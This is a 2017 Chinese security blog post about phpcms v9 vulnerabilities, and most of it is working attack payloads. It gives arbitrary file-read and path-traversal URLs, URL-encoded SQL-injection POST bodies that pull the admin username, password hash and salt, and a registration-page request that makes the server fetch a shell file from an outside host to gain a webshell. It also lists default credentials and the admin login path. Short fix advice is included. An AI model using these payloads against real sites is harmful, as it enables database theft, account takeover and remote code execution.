---
title: phpcms漏洞
date: 2017-04-12 09:07:42
comments: true
tags:
- phpcms漏洞
- 文件包含漏洞
- cms漏洞
categories: web安全
permalink: 01
---
<blockquote class="blockquote-center">风华是一指流砂，苍老是一段年华</blockquote>
　　最近某位大牛说，将放出3个phpcms的0day漏洞，目前我所了解到的已经有2个phpcms漏洞被流传开来，并放出了poc。phpcms应用范围还是比较广的，在此记录分享一下几个最新的phpcms漏洞。
<!--more -->
免责申明：*文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负*

### phpcms 任意文件读取漏洞
更新于2017年5月4日
漏洞具体细节参考：http://bobao.360.cn/learning/detail/3805.html
#### 漏洞利用
方案一：
登录普通用户，访问链接：
```bash
http://localhost/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&f=p%3%25252%2*70C
```
获取分配的att_json,然后将这段json值带入到down类的init函数中去：
```bash
http://localhost/index.php?m=content&c=down&a=init&a_k=013ceMuDOmbKROPvvdV0SvY95fzhHTfURBCK4CSbrnbVp0HQOGXTxiHdRp2jM-onG9vE0g5SKVcO_ASqdLoOSsBvN7nFFopz3oZSTo2P7b6N_UB037kehz2lj12lFGtTsPETp-a0mAHXgyjn-tN7cw4nZdk10Mr2g5NM_x215AeqpOF6_mIF7NsXvWiZl35EmQ
```
方案二：
在未登录的情况下访问：
```bash
http://localhost/index.php?m=wap&c=index&a=init&siteid=1
```
获取当前的siteid,然后再访问:
```bash
http://localhost/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3D./phpcms/modules/content/down.ph&f=p%3%25252%2*70C
POST_DATA:userid_flash=14e0uml6m504Lbwsd0mKpCe0EocnqxTnbfm4PPLW
```
#### 修复方案
升级至官方最新版本

### phpcms sql漏洞
#### Poc
存在sql注入漏洞的页面：
http://192.168.1.139:8080/phpcms/index.php?m=member&c=index&a=login
获取当前数据库，post：
```bash
forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bdatabase())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&code=验证码&dosubmit=%E7%99%BB%E5%BD%95
```
获取当前用户，post：
```bash
forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2buser())%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&code=验证码&dosubmit=%E7%99%BB%E5%BD%95
获取表名：
forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2btable_name%2bfrom%2binformation_schema.tables%2bwhere%2btable_schema='phpcmsv9'%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&code=验证码&dosubmit=%E7%99%BB%E5%BD%95
```
若要获取其他表名，修改limit即可。
获取用户名:
```bash
forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2busername%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&code=验证码&dosubmit=%E7%99%BB%E5%BD%95
```
获取密码：
```bash
forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&code=验证码&dosubmit=%E7%99%BB%E5%BD%95
```
获取到的密码为30位的md5，一般的MD5是32位，所以我们需要再获取后2位：
```bash
orward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(substring((select%2bpassword%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c-2%252c2))%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&code=验证码&dosubmit=%E7%99%BB%E5%BD%95
```
phpcms是加盐（salt）的，获取salt:
```bash
forward=http%253A%252F%252F192.168.1.139%253A8080%252Fphpcms%252Findex.php%253Fm%253Dmember&username=phpcms&password=123456%26username%3d%2527%2bunion%2bselect%2b%25272%2527%252c%2527test%255c%2527%252cupdatexml(1%252cconcat(0x5e24%252c(select%2bencrypt%2bfrom%2bv9_admin%2blimit%2b0%252c1)%252c0x5e24)%252c1)%252c%255c%2527123456%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%2527%255c%2527%252c%255c%25272%255c%2527%252c%255c%252710%255c%2527)%252c(%255c%25272%255c%2527%252c%255c%2527test%2527%252c%25275f1d7a84db00d2fce00b31a7fc73224f%2527%252c%2527123456%2527%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%252cnull%2523&code=验证码&dosubmit=%E7%99%BB%E5%BD%95
```
以上Poc来自：https://www.unhonker.com/bug/1834.html

#### exp漏洞利用脚本
exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/
exp脚本可以参考：https://www.waitalone.cn/phpcmsv9-authkey-exp.html
漏洞细节请参考：http://mp.weixin.qq.com/s/cI-wbQyX-3WLhxJ5kqez4A

#### 漏洞修复方案
* 去掉modules\content\down.php文件

### phpcms注册页面getshell漏洞

* 存在的漏洞：php远程文件包含、任意文件上传
* 漏洞利用点：phpcms注册页面
* 利用类型：http post请求导致任意文件上传+getshell

#### Post Poc
```bash
siteid=1&modelid=11&username=newbie&password=newbie&email=newbie@qq.com&info[content]=<img src=http://shhdmqz.com/newbie.txt?.php#.jpg>&dosubmit=1&protocol=
```
注意：*http://shhdmqz.com/newbie.txt*为远程服务器上的shell文件，这个漏洞利用了远程文件包含与文件上传漏洞。

#### 漏洞利用细节
　　访问注册页面发送post包，重构info字段内容，写入远程包含的文件地址《*img src=http://shhdmqz.com/newbie.txt?.php#.jpg*》，newbie.txt为文件名，?.php#.jpg为构造的文件名，为了绕过后缀名限制。回包将会有报错信息，但文件可以上传成功，且报错信息中含有上传的文件路径，可用菜刀链接。

#### exp漏洞利用脚本
exp利用脚本在这里不公开放出了，大家可以利用在线检测平台进行检测：https://www.seebug.org/monster/

#### 漏洞修复方案

暂时性修复：

* 关闭注册页面
* 关闭远程文件包含，即关闭allow_url_fopen

彻底性修复：
修改phpcms/libs/classes/attachement.class.php文件中的download函数在
foreach($remotefileurls as $k=>$file)循环中，大约是167行左右的位置，将
```bash
if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;            $filename = fileext($file);
```
修改成
```bash
$filename = fileext($k);
```

关于文件包含漏洞，可参考：[文件包含漏洞](http://thief.one/2017/04/10/2/)

### 任意文件读取漏洞
```bash
index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=..\/..\/caches/error_log.php 
```
### phpcms敏感信息

* 默认账号密码：phpcms/phpcms
* 默认后台： http://www.xx.com/index.php?m=admin&c=index&a=login&pc_hash=   
* 会员中心地址：index.php?m=member&c=index&a=login 


*本篇将持续跟踪phpcms最新漏洞状况，并附上检测方法以及修复方案，协助管理员早日修复漏洞，谢谢！*

>转载请说明出处:[phpcms漏洞| nMask'Blog](http://thief.one/2017/04/12/1/)
本文地址：http://thief.one/2017/04/12/1/



